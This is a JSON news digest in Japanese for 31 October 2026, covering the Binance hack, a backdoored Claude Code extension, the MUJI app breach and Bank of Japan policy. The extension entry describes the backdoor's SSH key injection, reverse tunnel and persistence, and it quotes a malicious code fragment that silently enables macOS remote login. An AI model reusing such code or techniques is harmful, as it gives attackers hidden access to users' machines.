@@ -1,0 +1,742 @@
+{
+  "date": "2026-10-31",
+  "generated_at": "2026-10-31T06:10:00+09:00",
+  "stats": {
+    "collected": 230,
+    "sources_ok": 25,
+    "sources_total": 26,
+    "by_group": {
+      "hackernews": 47,
+      "tech_blog": 80,
+      "news": 83,
+      "official": 20
+    },
+    "failed_sources": [
+      "coindesk_jp"
+    ]
+  },
+  "digest": [
+    {
+      "category": "sec",
+      "text": "Binance で推計約 63 億ドル（約 1 兆円）の不正出金。DevOps エンジニアの PC 侵害が起点とされ、北朝鮮の関与を指摘する分析も。同社は全額補償を表明し、ビットコインは 30 日朝に急落した。",
+      "keywords": [
+        "exchange-hack",
+        "crypto-exchange",
+        "bitcoin"
+      ]
+    },
+    {
+      "category": "sec",
+      "text": "Cursor のマーケットプレイスで配布された Claude Code の VS Code 拡張 v2.1.313 に SSH バックドア。拡張を消すだけでは残るため、authorized_keys や永続化の確認と資格情報のローテーションが必要。",
+      "keywords": [
+        "supply-chain",
+        "ai-security",
+        "claude"
+      ]
+    },
+    {
+      "category": "sec",
+      "text": "良品計画が MUJI アプリへの不正アクセスを公表。退会者を含む最大約 2,726 万件のメールアドレス・生年月日・性別が流出した可能性。",
+      "keywords": [
+        "data-breach",
+        "mobile-app"
+      ]
+    },
+    {
+      "category": "macro",
+      "text": "日銀は政策金利 1.25% 程度を据え置き、基調的な物価が 2% 目標と「おおむね整合的」と表明。保有 ETF の売却ペースを 2027 年 1 月から年間簿価 8,600 億円程度に引き上げる。",
+      "keywords": [
+        "boj-policy",
+        "interest-rates",
+        "etf"
+      ]
+    },
+    {
+      "category": "ai",
+      "text": "AI 時代の運用をめぐり、「AI が SRE のスキルを劣化させる」論考（HN 365 pt）と「読んでいないコードを本番観測で信頼する」論考（はてブ 277）が並んで話題に。",
+      "keywords": [
+        "ai-coding",
+        "observability"
+      ]
+    }
+  ],
+  "items": [
+    {
+      "id": "2026-10-31-wired-binance-hack",
+      "url": "https://www.wired.com/story/the-dollar63-billion-binance-hack-was-pulled-off-in-just-20-minutes/",
+      "title": "The $6.3B Binance hack was pulled off in just 20 minutes",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-30T21:50:01+09:00",
+      "category": "sec",
+      "keywords": [
+        "exchange-hack",
+        "crypto-exchange",
+        "security-incident"
+      ],
+      "score": 100,
+      "why": "HN 1711 pt（Arkham の追跡ページ）・HN 263 pt（WIRED）など複数スレッド",
+      "read_min": 8,
+      "tldr": "Binance で推計約 63 億ドル（約 1 兆円）の不正出金が発生し、暗号資産取引所のハッキングとして過去最大規模とされる。Binance の初期調査では DevOps エンジニアのノート PC が侵害され、攻撃者がサービスコンテナに入り込んで不正な出金トランザクションを送ったとしており、秘密鍵の漏えいは確認されていないという。",
+      "points": [
+        "Binance は 10 月 29 日夜（UTC）に問題を把握し、入出金を停止。約 30 億ドルを Tether・Circle・Arbitrum などと協力してオンチェーンで凍結したと説明（CoinPost・Binance の公式 X による）",
+        "Blockaid の分析では、EIP-7702 を悪用し nonce を変えた 50 件の承認を一括送信、うち 1 件が一致してホットウォレットの制御が奪われたとされる。その後、別の侵入箇所も見つかったと公表",
+        "TRM Labs など複数の分析企業は北朝鮮のハッキング部隊による犯行との見方を示している（Binance・当局の確定ではない）。Binance は SAFU 基金と自社資金で全額補償すると表明"
+      ],
+      "code": null,
+      "signal": "B! 1 · ▲ 1711",
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-phorion-claude-code-vsx-backdoor",
+      "url": "https://phorion.io/blog/offical-claude-code-vsx-compromise/",
+      "title": "Backdoor in Claude Code for VS Code extension on the Cursor Marketplace",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-30T16:09:12+09:00",
+      "category": "sec",
+      "keywords": [
+        "supply-chain",
+        "ai-security",
+        "claude"
+      ],
+      "score": 89,
+      "why": "HN 648 pt・584 pt・397 pt の 3 スレッドで話題",
+      "read_min": 10,
+      "tldr": "Claude Code の VS Code 拡張として Cursor のマーケットプレイス（Open VSX 系）に配布されたバージョン 2.1.313 にバックドアが注入されていた。拡張の読み込み時に、攻撃者の SSH 公開鍵の追加・逆方向 SSH トンネル・OS ごとの永続化・ホスト情報の送信を行う。",
+      "points": [
+        "extension.js 冒頭の即時実行関数が activate より前に動き、~/.ssh/authorized_keys に `svc-telemetry` という鍵を追記、外部ホストへ `-R *:0:localhost:22` のリバーストンネルを張る",
+        "macOS は LaunchAgent、Linux は @reboot の cron、Windows はスケジュールタスクで永続化。環境変数は KEY/TOKEN/SECRET などに一致する「名前」だけを送信するとされる",
+        "拡張を削除するだけでは残る。authorized_keys・LaunchAgent/cron・関連プロセスの確認と、該当端末から触れた資格情報のローテーションを推奨。Cursor は該当リリースを削除し、X では最大約 5,000 ユーザーへの影響との見積もりが共有されている"
+      ],
+      "code": {
+        "file": "extension.js",
+        "lang": "javascript",
+        "text": "else if (PLAT === \"darwin\") {\n  var rl = ex(\"systemsetup -getremotelogin 2>/dev/null\", 4000);\n  d.remoteLogin = rl;\n  if (/Off/i.test(rl)) {\n    det(\"sudo -n systemsetup -setremotelogin on >/dev/null 2>&1\");"
+      },
+      "signal": "B! 1 · ▲ 648",
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-signoz-sre-deskilling",
+      "url": "https://newsletter.signoz.io/p/ai-isnt-replacing-sres-its-deskilling",
+      "title": "AI isn't replacing SREs, it's deskilling them",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-31T00:52:18+09:00",
+      "category": "ai",
+      "keywords": [
+        "ai-agent",
+        "observability",
+        "incident-response"
+      ],
+      "score": 81,
+      "why": "HN 365 pt",
+      "read_min": 9,
+      "tldr": "AI がインシデント対応の定型作業を担うほど、SRE は例外的な障害に対応する力を失うという論考。1983 年の「Ironies of Automation」の議論を引き、医療・航空の事例とともに「意図的な非効率」や能動的に関わる human-in-the-loop 設計を提案する。",
+      "points": [
+        "AI 支援でのポリープ検出に慣れた内視鏡医が、AI なしの検出率を 28% から 22% に落としたという英国の研究（Lancet）を引用",
+        "生ログを読まない・仮説を立てない・システムのメンタルモデルを作らないといった形でスキルが見えずに劣化し、若手は最初から身につけない「never-skilling」に陥ると指摘",
+        "AI で解決できるインシデントでも人が取り組む訓練、AI の提案を承認するだけでない関与のしかたを勧める（筆者はオブザーバビリティ製品の企業ブログ）"
+      ],
+      "code": null,
+      "signal": "▲ 365",
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-ymotongpoo-unread-code-trust",
+      "url": "https://ymotongpoo.hatenablog.com/entry/2026/10/30/093000",
+      "title": "読んでいないコードを私たちはどれだけ信頼できるのか",
+      "source": "ymotongpoo.hatenablog.com",
+      "source_group": "tech_blog",
+      "published_at": "2026-10-30T09:38:15+09:00",
+      "category": "ai",
+      "keywords": [
+        "ai-coding",
+        "observability",
+        "code-review"
+      ],
+      "score": 81,
+      "why": "はてブ 277",
+      "read_min": 12,
+      "tldr": "AI が書いて人が読まないコードが増えるなか、テストだけでは信頼の根拠が足りず、本番環境での観測をテストと同じフィードバックループに組み込むべきだと論じる記事。",
+      "points": [
+        "AI が書いたコードとテストは同じ前提を共有しがちで、モックの多用も「テストが仮定した世界」での正しさしか示さない",
+        "タイムアウトや同時実行制御などの非機能要件は本番でしか確かめきれないため、影響範囲を限定した段階的リリースと SLO・エラーバジェットで展開を判断する",
+        "本番で見つけた暗黙の業務判断（端数処理・並び順など）は仕様化してテストに戻し、計装を実装完了の定義に含める"
+      ],
+      "code": null,
+      "signal": "B! 277",
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-impress-muji-app-leak",
+      "url": "https://internet.watch.impress.co.jp/docs/news/2152666.html",
+      "title": "無印良品、「MUJIアプリ」の利用者情報最大約2726万件が不正アクセスにより流出の可能性",
+      "source": "internet.watch.impress.co.jp",
+      "source_group": "tech_blog",
+      "published_at": "2026-10-30T15:32:44+09:00",
+      "category": "sec",
+      "keywords": [
+        "data-breach",
+        "mobile-app",
+        "security-incident"
+      ],
+      "score": 79,
+      "why": "はてブ 236",
+      "read_min": 4,
+      "tldr": "良品計画は、MUJI アプリへの外部からの不正アクセスを検知し、退会者を含む最大約 2,726 万件のメールアドレス・生年月日・性別が流出した可能性があると公表した。カード情報・氏名・住所・電話番号は含まれないとしている。",
+      "points": [
+        "公表は 10 月 30 日。不正アクセスの発生日や手口は明らかにされていない",
+        "アクセスを遮断して修正を適用済みで、MUJI アプリとネットストアは通常どおり利用できるとしている",
+        "該当する利用者には順次個別に連絡する予定"
+      ],
+      "code": null,
+      "signal": "B! 236",
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-levtech-mersenne-twister",
+      "url": "https://levtech.jp/media/detail_959/",
+      "title": "メルセンヌ・ツイスタ。PythonやC++でも使われる、世界標準「擬似乱数」の設計思想【松本眞】",
+      "source": "levtech.jp",
+      "source_group": "tech_blog",
+      "published_at": "2026-10-30T09:24:37+09:00",
+      "category": "be",
+      "keywords": [
+        "random-number",
+        "algorithm"
+      ],
+      "score": 81,
+      "why": "はてブ 263",
+      "read_min": null,
+      "tldr": "Python や C++ の標準ライブラリで使われる擬似乱数生成器メルセンヌ・ツイスタの考案者・松本眞氏へのインタビュー。設計思想を聞いている。",
+      "points": [],
+      "code": null,
+      "signal": "B! 263",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-yc-agent-swarms-minecraft",
+      "url": "https://labs.ycombinator.com/projects/games/index.html",
+      "title": "We ran AI agent swarms in Minecraft and Mindustry",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-30T06:40:28+09:00",
+      "category": "ai",
+      "keywords": [
+        "ai-agent",
+        "multi-agent"
+      ],
+      "score": 81,
+      "why": "HN 385 pt",
+      "read_min": null,
+      "tldr": "Y Combinator のラボが、Minecraft と Mindustry で AI エージェントの群れを動かした実験の報告。",
+      "points": [],
+      "code": null,
+      "signal": "B! 2 · ▲ 385",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-northflank-breach",
+      "url": "https://status.northflank.com",
+      "title": "Northflank Breached",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-31T00:10:31+09:00",
+      "category": "cloud",
+      "keywords": [
+        "security-incident",
+        "paas"
+      ],
+      "score": 75,
+      "why": "HN 244 pt",
+      "read_min": null,
+      "tldr": "クラウド実行基盤 Northflank のステータスページで侵害が告知され、HN で話題になった。影響範囲などの詳細は本文未確認。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 244",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-binarysecurity-azure-cross-tenant",
+      "url": "https://www.binarysecurity.no/posts/2026/10/one-root-case",
+      "title": "Azure's Weakest Link – Five Full Cross-Tenant Compromises",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-30T19:06:15+09:00",
+      "category": "cloud",
+      "keywords": [
+        "azure",
+        "vulnerability-management",
+        "multi-tenant"
+      ],
+      "score": 74,
+      "why": "HN 219 pt",
+      "read_min": null,
+      "tldr": "Azure で他テナントを完全に侵害できる 5 件の脆弱性について、共通の根本原因を解説するセキュリティ研究者の記事。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 219",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-calil-linux-kernel-cve",
+      "url": "https://blog.calil.jp/2026/10/linux-kernel.html",
+      "title": "Linuxカーネルの重大な脆弱性（CVE-2026-98432）によるカーリルへの影響について",
+      "source": "blog.calil.jp",
+      "source_group": "tech_blog",
+      "published_at": "2026-10-30T12:40:04+09:00",
+      "category": "sec",
+      "keywords": [
+        "linux",
+        "vulnerability-management"
+      ],
+      "score": 74,
+      "why": "はてブ 166",
+      "read_min": null,
+      "tldr": "10 月 15 日に公表された Linux カーネルのネットワーク処理の重大な脆弱性 CVE-2026-98432 について、図書館検索サービスのカーリルが自社への影響と対応を説明した記事。",
+      "points": [],
+      "code": null,
+      "signal": "B! 166",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-404media-proton-ai",
+      "url": "https://www.404media.co/protons-ceo-cancels-ai-re-interviews/",
+      "title": "Proton's CEO Cancels AI 'Re-Interviews'",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-31T02:24:45+09:00",
+      "category": "ai",
+      "keywords": [
+        "ai-economy",
+        "ai-adoption"
+      ],
+      "score": 73,
+      "why": "HN 208 pt・関連記事 HN 212 pt",
+      "read_min": null,
+      "tldr": "Proton の CEO が社員に課していた AI 活用をめぐる「再面接」を取りやめたと 404 Media が報じた。同社内の AI 方針をめぐる混乱を伝える関連記事も話題になっている。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 208",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-every-pii-less-db",
+      "url": "https://tech.every.tv/entry/2026/10/30/124255",
+      "title": "個人情報を自社のDBに持たない設計は、どこまでできるのか",
+      "source": "tech.every.tv",
+      "source_group": "tech_blog",
+      "published_at": "2026-10-30T14:48:02+09:00",
+      "category": "be",
+      "keywords": [
+        "privacy",
+        "software-design",
+        "authentication"
+      ],
+      "score": 72,
+      "why": "はてブ 146",
+      "read_min": null,
+      "tldr": "漏えい対策として、そもそも個人情報を自社のデータベースに持たない設計がどこまで可能かを検討した every のテックブログ記事。",
+      "points": [],
+      "code": null,
+      "signal": "B! 146",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-tinyworldformer-pico",
+      "url": "https://github.com/SheepSeb/tinyworldformer",
+      "title": "A tiny world model running games on a Raspberry Pi Pico 2 W",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-30T05:32:28+09:00",
+      "category": "ai",
+      "keywords": [
+        "world-model",
+        "edge-ai"
+      ],
+      "score": 76,
+      "why": "HN 268 pt",
+      "read_min": null,
+      "tldr": "Raspberry Pi Pico 2 W 上でゲームを動かす小さなワールドモデルを公開した GitHub リポジトリ。",
+      "points": [],
+      "code": null,
+      "signal": "B! 5 · ▲ 268",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-pico-css-unmaintained",
+      "url": "https://github.com/picocss/pico/discussions/754",
+      "title": "Pico CSS is no longer maintained",
+      "source": "hackernews",
+      "source_group": "hackernews",
+      "published_at": "2026-10-30T10:58:44+09:00",
+      "category": "be",
+      "keywords": [
+        "oss",
+        "css"
+      ],
+      "score": 71,
+      "why": "HN 184 pt",
+      "read_min": null,
+      "tldr": "軽量 CSS フレームワーク Pico CSS が今後メンテナンスされないことが GitHub の Discussions で告知された。",
+      "points": [],
+      "code": null,
+      "signal": "B! 1 · ▲ 184",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-boj-etf-sale-pace",
+      "url": "http://www.boj.or.jp/mopo/mpmdeci/mpr_2026/k261030c.pdf",
+      "title": "（参考）ETFの売却ペースの見直しに関する決定（2026年10月）",
+      "source": "boj.or.jp",
+      "source_group": "official",
+      "published_at": "2026-10-30T12:02:00+09:00",
+      "category": "funds",
+      "keywords": [
+        "boj-policy",
+        "etf"
+      ],
+      "score": 90,
+      "why": "日銀の公式発表",
+      "read_min": 3,
+      "tldr": "日銀は保有 ETF の年間売却ペースを簿価 3,300 億円程度から 8,600 億円程度（時価で 2 兆 4,600 億円程度）に引き上げると決めた。2027 年 1 月から実施する。",
+      "points": [
+        "売却額が市場全体の売買代金に占める割合は 0.05% 程度から 0.1% 程度へ。売却完了までの年数は約 112 年から約 43 年に短縮される計算",
+        "本年 1 月以降の売却は市場に大きな影響を与えずに進んだとの評価が見直しの前提",
+        "市場の状況に応じて売却額の一時的な調整・停止ができる点は従来どおり"
+      ],
+      "code": null,
+      "signal": null,
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-coinpost-binance-compensation",
+      "url": "https://coinpost.jp/?p=745631",
+      "title": "バイナンス、ハッキング流出額が約1兆円に上る 全額補償を表明",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-10-30T13:25:24+09:00",
+      "category": "crypto",
+      "keywords": [
+        "exchange-hack",
+        "crypto-exchange",
+        "bitcoin"
+      ],
+      "score": 88,
+      "why": "matched: ビットコイン・取引所の事故",
+      "read_min": 5,
+      "tldr": "Binance の不正流出額は推計約 63 億ドル（約 9,920 億円）で、同社は SAFU 基金と自社資金で全額を補償すると表明した。ビットコインは 30 日朝に大きく下落し、国内の交換業者にも送金制限などの対応が広がった。",
+      "points": [
+        "約 30 億ドルはオンチェーンで凍結済み。入出金を一時停止し、修復後に準備金証明（Proof of Reserves）を公開する予定",
+        "バイナンスジャパンは入出金を一時停止（顧客資産への影響は現時点で確認されていないとしている）。bitFlyer はバイナンスへの送金を制限",
+        "SBI ホールディングスは、グループの対バイナンス・エクスポージャーは限定的で連結業績への影響はないと発表"
+      ],
+      "code": null,
+      "signal": null,
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-coinpost-fsa-overseas-survey",
+      "url": "https://coinpost.jp/?p=745690",
+      "title": "金融庁、海外8地域の金融制度調査を公表 ステーブルコイン規制も整理",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-10-30T16:44:48+09:00",
+      "category": "crypto",
+      "keywords": [
+        "fsa",
+        "stablecoin",
+        "crypto-regulation"
+      ],
+      "score": 80,
+      "why": "matched: 金融庁の公表",
+      "read_min": 5,
+      "tldr": "金融庁は委託調査「海外 8 地域の金融制度調査」（609 ページ）を公表した。銀行・証券・保険に加え、各地域の暗号資産交換業者やステーブルコインの規制を整理している。",
+      "points": [
+        "米国のジーニアス法（施行は 2027 年 1 月 18 日の見通し）、EU の MiCA の経過措置（最長 18 カ月の猶予は 2026 年 6 月末に終了）などを整理",
+        "英国は FCA 案として、裏付け資産の第三者預託・翌営業日末までの償還・利息の保有者分配禁止を紹介。中国は暗号資産関連の仲介を全面禁止する立場を維持",
+        "国内では、7 月成立の金商法改正の暗号資産関連規定が公布から 1 年以内に施行される予定"
+      ],
+      "code": null,
+      "signal": null,
+      "pick": true
+    },
+    {
+      "id": "2026-10-31-nikkei-boj-hold-2pct",
+      "url": "https://www.nikkei.com/article/DGXZQOUB300M40Q6A031C2000000/",
+      "title": "日銀、物価2%到達を表明「目標と整合的な水準」 金利は据え置き決定",
+      "source": "nikkei.com",
+      "source_group": "news",
+      "published_at": "2026-10-30T12:34:21+09:00",
+      "category": "macro",
+      "keywords": [
+        "boj-policy",
+        "interest-rates",
+        "inflation"
+      ],
+      "score": 92,
+      "why": "matched: 金利・日銀の決定",
+      "read_min": null,
+      "tldr": "日銀は 10 月 30 日の金融政策決定会合で政策金利（1.25% 程度）の据え置きを決め、基調的な物価上昇率が目標の 2% と「おおむね整合的な水準」になったと表明した（NHK・日経の見出しと要約による）。",
+      "points": [],
+      "code": null,
+      "signal": "B! 24",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-bbc-us-tech-stocks-ai-cost",
+      "url": "https://www.bbc.co.uk/news/articles/cvwy72e0n72yo",
+      "title": "US tech stocks see sharp falls over AI cost fears",
+      "source": "bbc.co.uk",
+      "source_group": "news",
+      "published_at": "2026-10-31T01:13:02+09:00",
+      "category": "stocks",
+      "keywords": [
+        "us-stocks",
+        "ai-economy"
+      ],
+      "score": 70,
+      "why": "matched: 米国株",
+      "read_min": null,
+      "tldr": "AI 投資のコスト負担への懸念から米国のハイテク株が大きく下落したと BBC が報じた。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 206",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-ft-anthropic-ipo-rating",
+      "url": "https://www.ft.com/content/59383c7f-8d82-493f-bf01-d2e862a1018f",
+      "title": "Anthropic may not secure investment-grade rating after IPO, Blackstone says",
+      "source": "ft.com",
+      "source_group": "news",
+      "published_at": "2026-10-31T02:27:25+09:00",
+      "category": "stocks",
+      "keywords": [
+        "ipo",
+        "anthropic"
+      ],
+      "score": 65,
+      "why": "matched: 米国株・IPO",
+      "read_min": null,
+      "tldr": "Blackstone が、Anthropic は上場後も投資適格の格付けを得られない可能性があるとの見方を示したと FT が報じた。",
+      "points": [],
+      "code": null,
+      "signal": "▲ 143",
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-coinpost-btc-october",
+      "url": "https://coinpost.jp/?p=745506",
+      "title": "ビットコインが冷却局面に、10月（アップトーバー）は4.2%安＝クリプトクアント",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-10-30T16:00:12+09:00",
+      "category": "crypto",
+      "keywords": [
+        "bitcoin"
+      ],
+      "score": 70,
+      "why": "matched: ビットコイン",
+      "read_min": null,
+      "tldr": "CryptoQuant の週間レポートを紹介し、ビットコインの需要縮小と米国勢の買い控えを指摘している。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-coinpost-franklin-btc-etf",
+      "url": "https://coinpost.jp/?p=745544",
+      "title": "米フランクリン、配当をビットコインに再投資するETF2本を上場へ",
+      "source": "coinpost.jp",
+      "source_group": "news",
+      "published_at": "2026-10-30T11:00:08+09:00",
+      "category": "crypto",
+      "keywords": [
+        "crypto-etf",
+        "bitcoin"
+      ],
+      "score": 68,
+      "why": "matched: 米国株, ビットコイン",
+      "read_min": null,
+      "tldr": "フランクリン・テンプルトンは、米国株とビットコインを組み合わせ、配当をビットコインに再投資する ETF 2 本をナスダックに上場すると発表した。株式 95%・ビットコイン 5% で運用を始める。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-diamond-inheritance-tax-realestate",
+      "url": "https://diamond.jp/articles/-/402183",
+      "title": "相続税評価ルール激変、最大の標的は「不動産小口化商品」！",
+      "source": "diamond.jp",
+      "source_group": "news",
+      "published_at": "2026-10-31T04:50:00+09:00",
+      "category": "realestate",
+      "keywords": [
+        "inheritance-tax",
+        "real-estate-investment"
+      ],
+      "score": 60,
+      "why": "matched: 不動産",
+      "read_min": null,
+      "tldr": "国税庁が 9 月 18 日に公表した通達案で、賃貸不動産を使った相続税の節税スキーム、特に不動産小口化商品の評価ルールが変わる点を税理士が解説する記事（来年 1 月の適用を前提）。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    },
+    {
+      "id": "2026-10-31-boj-etf-guideline-revision",
+      "url": "http://www.boj.or.jp/mopo/mpmdeci/mpr_2026/mpr261030a.pdf",
+      "title": "「指数連動型上場投資信託受益権等の処分の指針」の一部改正について",
+      "source": "boj.or.jp",
+      "source_group": "official",
+      "published_at": "2026-10-30T14:00:00+09:00",
+      "category": "funds",
+      "keywords": [
+        "boj-policy",
+        "etf"
+      ],
+      "score": 75,
+      "why": "日銀の公式発表",
+      "read_min": null,
+      "tldr": "ETF 売却ペースの見直しに合わせて、日銀が保有 ETF などの処分の指針を一部改正した。",
+      "points": [],
+      "code": null,
+      "signal": null,
+      "pick": false
+    }
+  ],
+  "social": [
+    {
+      "network": "x",
+      "author": "@mattjay",
+      "url": "https://x.com/mattjay/status/2116023617364570171",
+      "text": "公式の Claude Code VS Code 拡張が侵害され、短い時間帯に更新を取り込むと SSH バックドアが入る状態だったと注意喚起。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "supply-chain",
+        "claude"
+      ],
+      "posted_at": "2026-10-30T13:25:18+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@cyb3rops",
+      "url": "https://x.com/cyb3rops/status/2116080744871125428",
+      "text": "Cursor が拡張マーケットプレイスでトロイの木馬化された anthropic.claude-code v2.1.313 を 10 月 29 日 09:27〜20:35 UTC に確認し、影響は最大約 5,000 ユーザーと見積もっていると紹介。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "supply-chain",
+        "ai-security"
+      ],
+      "posted_at": "2026-10-30T17:12:19+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@binance",
+      "url": "https://x.com/binance/status/2115993361517891592",
+      "text": "初期調査では DevOps エンジニアのノート PC の侵害からサービスコンテナに入られ不正な出金が送られた可能性があり、秘密鍵漏えいの証拠はないと説明。",
+      "metrics": null,
+      "heat": null,
+      "category": "sec",
+      "keywords": [
+        "exchange-hack",
+        "crypto-exchange"
+      ],
+      "posted_at": "2026-10-30T11:25:05+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@skesslr",
+      "url": "https://x.com/skesslr/status/2115994778894553569",
+      "text": "研究者（TRM Labs など）によれば、63 億ドルの Binance ハックは北朝鮮によるものとみられると WSJ 記者が投稿。",
+      "metrics": null,
+      "heat": null,
+      "category": "crypto",
+      "keywords": [
+        "exchange-hack",
+        "crypto-exchange"
+      ],
+      "posted_at": "2026-10-30T11:30:43+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@t_ryoma1985",
+      "url": "https://x.com/t_ryoma1985/status/2116020999514935491",
+      "text": "日銀の 10 月展望レポートで 2027 年度の CPI 見通しが +2.6% に上方修正され、物価は上振れリスクが優勢とまとめた投稿。",
+      "metrics": null,
+      "heat": null,
+      "category": "macro",
+      "keywords": [
+        "boj-policy",
+        "inflation"
+      ],
+      "posted_at": "2026-10-30T13:14:54+09:00"
+    },
+    {
+      "network": "x",
+      "author": "@YahooFinance",
+      "url": "https://x.com/YahooFinance/status/2116172114474516958",
+      "text": "推計 63 億ドルのハック後、Binance の創業者が利用者を落ち着かせようとしていると伝える投稿。",
+      "metrics": null,
+      "heat": null,
+      "category": "crypto",
+      "keywords": [
+        "exchange-hack",
+        "bitcoin"
+      ],
+      "posted_at": "2026-10-30T23:15:23+09:00"
+    },
+    {
+      "network": "hn",
+      "author": null,
+      "url": "https://news.ycombinator.com/item?id=50296470",
+      "text": "『Binance-hacker-1029 – $5.6B stolen from Binance』のスレッド。1190 件のコメント",
+      "metrics": "▲ 1,711  ✉ 1,190",
+      "heat": 100,
+      "category": "sec",
+      "keywords": [
+        "exchange-hack"
+      ],
+      "posted_at": "2026-10-30T06:38:59+09:00"
+    }
+  ],
+  "releases": [
+    {
+      "date": "2026-11-03",
+      "title": "米中間選挙",
+      "repo": null,
+      "url": "https://www.afpbb.com/articles/-/3659650",
+      "kind": "event",
+      "note": "11 月 3 日実施（前日までの確認に基づく）",
+      "category": "macro"
+    },
+    {
+      "date": "2026-11-06",
+      "title": "米雇用統計（10 月分）",
+      "repo": null,
+      "url": "https://www.oanda.jp/lab-education/beginners/fundamentals_analysis/us_job_report/",
+      "kind": "event",
+      "note": "日本時間 11 月 6 日 22:30 発表予定（OANDA の指標一覧による。BLS の公式日程は未確認）",
+      "category": "macro"
+    },
+    {
+      "date": "2026-10-30",
+      "title": "日銀 ETF 売却ペースの見直し（2027 年 1 月から年間簿価 8,600 億円程度）",
+      "repo": null,
+      "url": "http://www.boj.or.jp/mopo/mpmdeci/mpr_2026/k261030c.pdf",
+      "kind": "policy",
+      "note": "金融政策決定会合で決定。処分の指針も一部改正",
+      "category": "funds"
+    }
+  ]
+}
